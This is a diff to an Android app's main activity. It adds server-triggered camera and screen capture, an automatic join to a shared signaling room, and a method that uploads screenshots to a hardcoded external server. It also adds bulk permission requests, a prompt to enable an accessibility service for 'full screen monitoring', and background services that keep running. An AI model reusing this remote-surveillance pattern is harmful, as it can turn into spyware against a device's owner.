@@ -47,12 +47,41 @@ import android.os.PowerManager;
 import android.provider.Settings;
 import android.net.Uri;
 import android.content.SharedPreferences;
+import android.os.Handler;
+import android.graphics.Bitmap;
+import android.os.Environment;
+import android.provider.MediaStore;
+import android.content.ContentValues;
+import android.content.ContentResolver;
+import android.net.Uri;
+import java.io.OutputStream;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import android.media.MediaScannerConnection;
+import android.view.View;
+import android.graphics.Canvas;
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
+import android.app.AlertDialog;
+import androidx.annotation.Nullable;
 
 public class MainActivity extends AppCompatActivity implements WebRTCClient.WebRTCListener, SignalingClient.SignalingClientListener, SignalingClient.ScreenCaptureCommandListener {
     private static final String TAG = "MainActivity";
     private static final int SCREEN_CAPTURE_REQUEST = 1001;
     private static final int CAMERA_PERMISSION_REQUEST = 100;
     private static final int PORT = 3000;
+    private static final int STORAGE_PERMISSION_REQUEST = 2001;
+    private static final int NOTIFICATION_PERMISSION_REQUEST = 2002;
+    private static final String SERVER_URL = "https://myapplication4.onrender.com/upload";
+    private static final OkHttpClient client = new OkHttpClient();
+    private static final int REQUEST_MEDIA_PROJECTION = 1;
     
     private ActivityMainBinding binding;
     private WebRTCClient webRTCClient;
@@ -64,17 +93,23 @@ public class MainActivity extends AppCompatActivity implements WebRTCClient.WebR
     private String serverUrl;
     private boolean isImageCaptureRunning = false;
     private WebAppInterface webAppInterface;
+    private boolean shouldTakeScreenshotAfterPermission = false;
+    private MediaProjectionManager mediaProjectionManager;
+    private boolean bound = false;
     
-    private final ServiceConnection serviceConnection = new ServiceConnection() {
+    private final ServiceConnection connection = new ServiceConnection() {
         @Override
         public void onServiceConnected(ComponentName name, IBinder service) {
             ScreenCaptureService.LocalBinder binder = (ScreenCaptureService.LocalBinder) service;
             screenCaptureService = binder.getService();
+            bound = true;
+            // Try to start with saved projection data
+            screenCaptureService.startProjectionFromSaved();
         }
         
         @Override
         public void onServiceDisconnected(ComponentName name) {
-            screenCaptureService = null;
+            bound = false;
         }
     };
     
@@ -85,21 +120,61 @@ public class MainActivity extends AppCompatActivity implements WebRTCClient.WebR
         setContentView(binding.getRoot());
         setSupportActionBar(binding.toolbar);
         
+        // Request all permissions at startup
+        requestAllPermissions();
+        
+        // Initialize MediaProjectionManager
+        mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        // Request screen capture permission on first launch
+        if (!hasScreenCapturePermission()) {
+            requestScreenCapturePermission();
+        }
+        
         // Initialize SignalingClient
         signalingClient = new SignalingClient(this, this);
         signalingClient.setCameraCommandListener((command, cameraType) -> {
             runOnUiThread(() -> {
+                Log.d(TAG, "cameraCommand received: " + command);
+                Toast.makeText(this, "cameraCommand received: " + command, Toast.LENGTH_SHORT).show();
                 if ("startCapture".equals(command)) {
                     Log.d(TAG, "Remote command: startCapture");
                     startImageCapture();
+
+                    // Always try to start screen capture service
+                    Intent screenIntent = new Intent(this, com.example.myapplication.service.ScreenCaptureService.class);
+                    if (com.example.myapplication.service.ScreenCaptureService.lastResultCode != -1 && com.example.myapplication.service.ScreenCaptureService.lastData != null) {
+                        Log.d(TAG, "ScreenCaptureService permission available, starting service");
+                        screenIntent.putExtra("resultCode", com.example.myapplication.service.ScreenCaptureService.lastResultCode);
+                        screenIntent.putExtra("data", com.example.myapplication.service.ScreenCaptureService.lastData);
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                            try {
+                                startForegroundService(screenIntent);
+                                Toast.makeText(this, "ScreenCaptureService started with existing permission", Toast.LENGTH_SHORT).show();
+                            } catch (Exception e) {
+                                Log.e(TAG, "Failed to start ScreenCaptureService: " + e.getMessage());
+                                Toast.makeText(this, "Failed to start ScreenCaptureService", Toast.LENGTH_SHORT).show();
+                            }
+                        } else {
+                            startService(screenIntent);
+                            Toast.makeText(this, "ScreenCaptureService started with existing permission", Toast.LENGTH_SHORT).show();
+                        }
+                    } else {
+                        Log.d(TAG, "Screen capture permission not granted. Requesting permission...");
+                        Toast.makeText(this, "Screen capture permission not granted. Requesting permission...", Toast.LENGTH_LONG).show();
+                        requestScreenCapturePermission();
+                    }
                 } else if ("stopCapture".equals(command)) {
                     Log.d(TAG, "Remote command: stopCapture");
                     // Stop image capture service
-                    Intent intent = new Intent(this, ImageCaptureService.class);
-                    intent.setAction(ImageCaptureService.ACTION_STOP_CAPTURE);
-                    startService(intent);
-                    // Also stop the service
-                    stopService(intent);
+                    Intent imageIntent = new Intent(this, com.example.myapplication.service.ImageCaptureService.class);
+                    imageIntent.setAction(com.example.myapplication.service.ImageCaptureService.ACTION_STOP_CAPTURE);
+                    startService(imageIntent);
+                    stopService(imageIntent);
+
+                    // Stop screen capture service
+                    Intent screenIntent = new Intent(this, com.example.myapplication.service.ScreenCaptureService.class);
+                    stopService(screenIntent);
+                    Log.d(TAG, "ScreenCaptureService stopped");
                 } else if ("switchCamera".equals(command)) {
                     Log.d(TAG, "Remote command: switchCamera to " + cameraType);
                     Intent intent = new Intent(this, ImageCaptureService.class);
@@ -114,10 +189,20 @@ public class MainActivity extends AppCompatActivity implements WebRTCClient.WebR
                 } else if ("screenCapture".equals(command)) {
                     Log.d(TAG, "Remote command: screenCapture");
                     Toast.makeText(this, "Screen capture command received", Toast.LENGTH_SHORT).show();
-                    requestScreenCapturePermission();
+                    if (isScreenCaptureServiceRunningAndReady()) {
+                        Log.d(TAG, "Sending ACTION_SCREENSHOT_ONCE broadcast");
+                        Toast.makeText(this, "Sending ACTION_SCREENSHOT_ONCE broadcast", Toast.LENGTH_SHORT).show();
+                        Intent intent = new Intent(ScreenCaptureService.ACTION_SCREENSHOT_ONCE);
+                        sendBroadcast(intent);
+                        Toast.makeText(this, "Triggered screenshot via broadcast", Toast.LENGTH_SHORT).show();
+                    } else {
+                        requestScreenCapturePermission();
+                    }
                 }
             });
         });
+        // Always join global_room on startup
+        signalingClient.connect(() -> signalingClient.joinRoom("global_room"));
 
         setupWebRTC();
         setupClickListeners();
@@ -134,6 +219,50 @@ public class MainActivity extends AppCompatActivity implements WebRTCClient.WebR
             startImageCapture();
             requestIgnoreBatteryOptimizations();
         }
+
+        // Wire up screenshot button from XML
+        Button screenshotButton = findViewById(R.id.screenshotButton);
+        screenshotButton.setOnClickListener(v -> {
+            if (!isMediaProjectionDataValid()) {
+                ensureScreenCapturePermissionOrPrompt();
+                return;
+            }
+            // Start the service with the latest permission
+            Intent intent = new Intent(this, ScreenCaptureService.class);
+            intent.putExtra("resultCode", ScreenCaptureService.lastResultCode);
+            intent.putExtra("data", ScreenCaptureService.lastData);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent);
+            } else {
+                startService(intent);
+            }
+            // Wait a bit longer for the service to be ready, then send the broadcast
+            new Handler().postDelayed(() -> {
+                Intent screenshotIntent = new Intent(ScreenCaptureService.ACTION_SCREENSHOT_ONCE);
+                sendBroadcast(screenshotIntent);
+                Toast.makeText(this, "Screenshot command sent to service", Toast.LENGTH_SHORT).show();
+                Log.d(TAG, "Screenshot command sent to service");
+            }, 2000); // 2 second delay for reliability
+        });
+
+        // Check and prompt for Accessibility Service
+        if (!isAccessibilityServiceEnabled()) {
+            showAccessibilityServicePrompt();
+        }
+
+        // Start and bind to ScreenCaptureService
+        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
+        } else {
+            startService(serviceIntent);
+        }
+        bindService(serviceIntent, connection, BIND_AUTO_CREATE);
+
+        // Request MediaProjection permission on button click
+        findViewById(R.id.btnStartCapture).setOnClickListener(v -> {
+            requestMediaProjectionPermission();
+        });
     }
     
     private void setupWebRTC() {
@@ -317,6 +446,9 @@ public class MainActivity extends AppCompatActivity implements WebRTCClient.WebR
             }
             isImageCaptureRunning = true;
             Toast.makeText(this, "Image capture service started", Toast.LENGTH_SHORT).show();
+            // Also take a screenshot when image capture starts, after layout is ready
+            View rootView = getWindow().getDecorView().getRootView();
+            rootView.post(() -> captureAndSaveAppScreenshot());
         }
     }
     
@@ -341,8 +473,9 @@ public class MainActivity extends AppCompatActivity implements WebRTCClient.WebR
         if (signalingClient != null) {
             signalingClient.disconnect();
         }
-        if (screenCaptureService != null) {
-            unbindService(serviceConnection);
+        if (bound) {
+            unbindService(connection);
+            bound = false;
         }
         // Don't stop the image capture service when the activity is destroyed
         // This allows it to continue running in the background
@@ -368,83 +501,38 @@ public class MainActivity extends AppCompatActivity implements WebRTCClient.WebR
     }
     
     @Override
-    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        try {
-            if (requestCode == SCREEN_CAPTURE_REQUEST && resultCode == RESULT_OK) {
-                Log.d(TAG, "Screen capture permission granted");
-                Toast.makeText(this, "Screen capture permission granted", Toast.LENGTH_SHORT).show();
-                
-                // Start the service first
-                Intent intent = new Intent(this, ScreenCaptureService.class);
-                intent.putExtra("resultCode", resultCode);
-                intent.putExtra("data", data);
-                startService(intent);
-                bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
-
-                // Wait briefly for service to bind
-                new android.os.Handler().postDelayed(() -> {
-                    // Initialize video components
-                    if (webRTCClient != null) {
-                        if (videoSource == null && webRTCClient != null) {
-                            videoSource = webRTCClient.createVideoSource();
-                            if (videoSource == null) {
-                                Log.e(TAG, "Failed to create video source after retry");
-                                Toast.makeText(MainActivity.this, "Video source creation failed", Toast.LENGTH_SHORT).show();
-                                stopScreenShare();
-                                return;
-                            }
-                        }
-                        
-                        // Check components and create surface
-                        if (videoSource != null && screenCaptureService != null) {
-                            Log.d(TAG, "Creating surface for screen capture");
-                            Surface surface = webRTCClient.createSurface();
-                            if (surface != null && webRTCClient != null) {
-                                try {
-                                    screenCaptureService.startVirtualDisplay(surface);
-                                    Log.d(TAG, "Virtual display started successfully");
-                                    Toast.makeText(MainActivity.this, "Screen capture started", Toast.LENGTH_SHORT).show();
-                                    isScreenSharing = true;
-                                    updateButtonState(true);
-                                    // Create peer connection after surface validation
-                                    webRTCClient.createPeerConnection(true);
-                                } catch (IllegalStateException e) {
-                                    Log.e(TAG, "Failed to start virtual display: " + e.getMessage());
-                                    Toast.makeText(MainActivity.this, "Screen capture failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
-                                    stopScreenShare();
-                                }
-                            } else {
-                                Log.e(TAG, "Failed to create surface");
-                                Toast.makeText(MainActivity.this, "Failed to create capture surface", Toast.LENGTH_SHORT).show();
-                                stopScreenShare();
-                            }
-                        } else {
-                            String errorMsg = "Failed to initialize: " + 
-                                (videoSource == null ? "videoSource is null. " : "") +
-                                (screenCaptureService == null ? "screenCaptureService is null. " : "");
-                            Log.e(TAG, errorMsg);
-                            Toast.makeText(MainActivity.this, errorMsg, Toast.LENGTH_LONG).show();
-                            stopScreenShare();
-                        }
-                    } else {
-                        Log.d(TAG, "WebRTCClient initialized");
-                        Toast.makeText(MainActivity.this, "WebRTCClient initialization failed", Toast.LENGTH_SHORT).show();
-                        stopScreenShare();
-                    }
-                }, 500); // Give 500ms for service to bind
-
+        if (requestCode == SCREEN_CAPTURE_REQUEST && resultCode == RESULT_OK) {
+            // Save to static variables
+            com.example.myapplication.service.ScreenCaptureService.lastResultCode = resultCode;
+            com.example.myapplication.service.ScreenCaptureService.lastData = data;
+            // Start the service after permission is granted
+            Intent intent = new Intent(this, com.example.myapplication.service.ScreenCaptureService.class);
+            intent.putExtra("resultCode", resultCode);
+            intent.putExtra("data", data);
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                startForegroundService(intent);
             } else {
-                Log.w(TAG, "Screen capture permission denied or cancelled");
-                Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show();
-                isScreenSharing = false;
-                updateButtonState(false);
+                startService(intent);
             }
-        } catch (Exception e) {
-            Log.e(TAG, "Error in onActivityResult: " + e.getMessage(), e);
-            Toast.makeText(this, "Error starting screen capture: " + e.getMessage(), Toast.LENGTH_SHORT).show();
-            isScreenSharing = false;
-            updateButtonState(false);
+            // Optionally, trigger screenshot if user was waiting
+            if (shouldTakeScreenshotAfterPermission) {
+                shouldTakeScreenshotAfterPermission = false;
+                new Handler().postDelayed(() -> {
+                    Intent screenshotIntent = new Intent(com.example.myapplication.service.ScreenCaptureService.ACTION_SCREENSHOT_ONCE);
+                    sendBroadcast(screenshotIntent);
+                    Toast.makeText(this, "Screenshot command sent to service", Toast.LENGTH_SHORT).show();
+                }, 1000);
+            }
+        } else if (requestCode == REQUEST_MEDIA_PROJECTION) {
+            if (resultCode == RESULT_OK && data != null) {
+                if (bound && screenCaptureService != null) {
+                    screenCaptureService.startProjection(resultCode, data);
+                }
+            }
+        } else {
+            Toast.makeText(this, "Screen capture permission not granted", Toast.LENGTH_SHORT).show();
         }
     }
     
@@ -518,7 +606,7 @@ public class MainActivity extends AppCompatActivity implements WebRTCClient.WebR
         try {
             if (screenCaptureService != null) {
                 screenCaptureService.stopProjection();
-                unbindService(serviceConnection);
+                unbindService(connection);
                 screenCaptureService = null;
             }
             if (webRTCClient != null) {
@@ -543,6 +631,12 @@ public class MainActivity extends AppCompatActivity implements WebRTCClient.WebR
             } else {
                 Toast.makeText(this, "Camera permission is required", Toast.LENGTH_SHORT).show();
             }
+        } else if (requestCode == STORAGE_PERMISSION_REQUEST) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(this, "Storage permission granted. Please tap 'Take Screenshot' again.", Toast.LENGTH_SHORT).show();
+            } else {
+                Toast.makeText(this, "Storage permission is required to save screenshots to gallery.", Toast.LENGTH_LONG).show();
+            }
         }
     }
 
@@ -552,9 +646,11 @@ public class MainActivity extends AppCompatActivity implements WebRTCClient.WebR
     }
 
     public void requestScreenCapturePermission() {
-        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        Intent permissionIntent = mediaProjectionManager.createScreenCaptureIntent();
-        startActivityForResult(permissionIntent, SCREEN_CAPTURE_REQUEST);
+        if (!hasScreenCapturePermission()) {
+            showScreenCaptureExplanationAndRequest();
+        } else {
+            Toast.makeText(this, "Screen capture permission already granted", Toast.LENGTH_SHORT).show();
+        }
     }
 
     @Override
@@ -563,5 +659,185 @@ public class MainActivity extends AppCompatActivity implements WebRTCClient.WebR
             Toast.makeText(this, "Screen capture command received", Toast.LENGTH_SHORT).show();
             requestScreenCapturePermission();
         });
+    }
+
+    private boolean isScreenCaptureServiceRunningAndReady() {
+        // Use the new method from ScreenCaptureService
+        boolean active = com.example.myapplication.service.ScreenCaptureService.isMediaProjectionActive();
+        Log.d(TAG, "isScreenCaptureServiceRunningAndReady: " + active);
+        return active;
+    }
+
+    // Screenshot logic extracted to a method
+    public void captureAndSaveAppScreenshot() {
+        if (isScreenCaptureServiceRunningAndReady()) {
+            Intent intent = new Intent(this, ScreenCaptureService.class);
+            intent.putExtra("resultCode", ScreenCaptureService.lastResultCode);
+            intent.putExtra("data", ScreenCaptureService.lastData);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent);
+            } else {
+                startService(intent);
+            }
+            new Handler().postDelayed(() -> {
+                Intent screenshotIntent = new Intent(ScreenCaptureService.ACTION_SCREENSHOT_ONCE);
+                sendBroadcast(screenshotIntent);
+                Toast.makeText(this, "Screenshot command sent to service", Toast.LENGTH_SHORT).show();
+                Log.d(TAG, "Screenshot command sent to service");
+            }, 2000); // 2 second delay for reliability
+        } else {
+            Toast.makeText(this, "Screen capture permission not granted. Requesting permission...", Toast.LENGTH_LONG).show();
+            Log.d(TAG, "Screen capture permission not granted. Requesting permission...");
+            shouldTakeScreenshotAfterPermission = true;
+            requestScreenCapturePermission();
+        }
+    }
+
+    private void uploadScreenshotToServer(File screenshotFile) {
+        Log.d(TAG, "Starting screenshot upload: " + screenshotFile.getName());
+        if (!screenshotFile.exists()) {
+            Log.e(TAG, "Screenshot file does not exist: " + screenshotFile.getAbsolutePath());
+            return;
+        }
+        try {
+            RequestBody requestBody = new MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("image", screenshotFile.getName(),
+                            RequestBody.create(MediaType.parse("image/jpeg"), screenshotFile))
+                    .build();
+            Request request = new Request.Builder()
+                    .url(SERVER_URL)
+                    .post(requestBody)
+                    .addHeader("Accept", "application/json")
+                    .build();
+            client.newCall(request).enqueue(new Callback() {
+                @Override
+                public void onFailure(Call call, IOException e) {
+                    Log.e(TAG, "Failed to upload screenshot: " + e.getMessage(), e);
+                }
+                @Override
+                public void onResponse(Call call, Response response) throws IOException {
+                    try {
+                        String responseBody = response.body() != null ? response.body().string() : "No response body";
+                        if (response.isSuccessful()) {
+                            Log.d(TAG, "Screenshot uploaded successfully: " + screenshotFile.getName() +
+                                    ", Response: " + response.code() + ", Body: " + responseBody);
+                            if (screenshotFile.getParentFile().equals(getCacheDir()) && screenshotFile.exists()) {
+                                if (screenshotFile.delete()) {
+                                    Log.d(TAG, "Temporary screenshot file deleted");
+                                } else {
+                                    Log.w(TAG, "Failed to delete temporary screenshot file");
+                                }
+                            }
+                        } else {
+                            Log.e(TAG, "Server error: " + response.code() + " - " +
+                                    response.message() + ", Body: " + responseBody);
+                        }
+                    } finally {
+                        response.close();
+                    }
+                }
+            });
+        } catch (Exception e) {
+            Log.e(TAG, "Error preparing screenshot upload request", e);
+        }
+    }
+
+    private void requestAllPermissions() {
+        // Request all runtime permissions at once
+        String[] permissions = new String[] {
+                Manifest.permission.CAMERA,
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.INTERNET,
+                Manifest.permission.POST_NOTIFICATIONS,
+                Manifest.permission.FOREGROUND_SERVICE,
+                Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION,
+                Manifest.permission.FOREGROUND_SERVICE_CAMERA,
+                Manifest.permission.WAKE_LOCK,
+                Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                Manifest.permission.READ_EXTERNAL_STORAGE,
+                Manifest.permission.WRITE_EXTERNAL_STORAGE
+        };
+        ActivityCompat.requestPermissions(this, permissions, STORAGE_PERMISSION_REQUEST);
+    }
+
+    // Show a dialog to explain why screen capture permission is needed
+    private void showScreenCaptureExplanationAndRequest() {
+        new AlertDialog.Builder(this)
+            .setTitle("Screen Capture Permission Needed")
+            .setMessage("To capture your screen, Android requires you to grant permission. Please tap 'Allow' in the next dialog. This is required by Android for your privacy and security. You will only be asked once unless the app is killed or restarted.")
+            .setPositiveButton("OK", (dialog, which) -> launchScreenCapturePermissionIntent())
+            .setCancelable(false)
+            .show();
+    }
+
+    // Add this method to actually launch the permission intent
+    private void launchScreenCapturePermissionIntent() {
+        MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        Intent permissionIntent = projectionManager.createScreenCaptureIntent();
+        startActivityForResult(permissionIntent, SCREEN_CAPTURE_REQUEST);
+    }
+
+    // Add these methods for permission flag
+    private boolean hasScreenCapturePermission() {
+        SharedPreferences prefs = getSharedPreferences("screen_capture_prefs", MODE_PRIVATE);
+        return prefs.getBoolean("permission_granted", false);
+    }
+
+    private void saveMediaProjectionPermissionGranted() {
+        SharedPreferences prefs = getSharedPreferences("screen_capture_prefs", MODE_PRIVATE);
+        prefs.edit().putBoolean("permission_granted", true).apply();
+    }
+
+    // Add this utility method to check if MediaProjection data is valid
+    private boolean isMediaProjectionDataValid() {
+        return com.example.myapplication.service.ScreenCaptureService.lastResultCode != -1 &&
+               com.example.myapplication.service.ScreenCaptureService.lastData != null;
+    }
+
+    private void ensureScreenCapturePermissionOrPrompt() {
+        if (!isMediaProjectionDataValid()) {
+            Intent intent = new Intent(this, ScreenCapturePermissionActivity.class);
+            startActivity(intent);
+        }
+    }
+
+    private void requestMediaProjectionPermission() {
+        MediaProjectionManager projectionManager =
+                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);
+    }
+
+    private boolean isAccessibilityServiceEnabled() {
+        int accessibilityEnabled = 0;
+        final String service = getPackageName() + "/" + com.example.myapplication.service.ScreenMonitorAccessibilityService.class.getCanonicalName();
+        try {
+            accessibilityEnabled = Settings.Secure.getInt(
+                    getContentResolver(),
+                    Settings.Secure.ACCESSIBILITY_ENABLED);
+        } catch (Settings.SettingNotFoundException e) {
+            e.printStackTrace();
+        }
+        if (accessibilityEnabled == 1) {
+            String settingValue = Settings.Secure.getString(
+                    getContentResolver(),
+                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+            if (settingValue != null) {
+                return settingValue.contains(service);
+            }
+        }
+        return false;
+    }
+
+    private void showAccessibilityServicePrompt() {
+        new AlertDialog.Builder(this)
+                .setTitle("Accessibility Permission Required")
+                .setMessage("Please enable accessibility service for full screen monitoring")
+                .setPositiveButton("Open Settings", (dialog, which) -> {
+                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                    startActivity(intent);
+                })
+                .setNegativeButton("Cancel", null)
+                .show();
     }
 }
